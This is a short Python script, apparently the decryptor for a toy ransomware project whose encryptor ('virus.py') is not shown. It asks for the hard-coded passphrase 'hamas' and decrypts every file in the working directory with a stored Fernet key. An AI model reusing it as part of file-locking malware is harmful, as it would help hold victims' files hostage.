#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
	if file == "virus.py" or file == "thekey.key" or file == "antivirus.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "hamas"

user_pharse = input("enter the key\n")

if user_pharse == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congratulation, Your file has been decrypted")
else:
		print("sorry, Wrong Key")
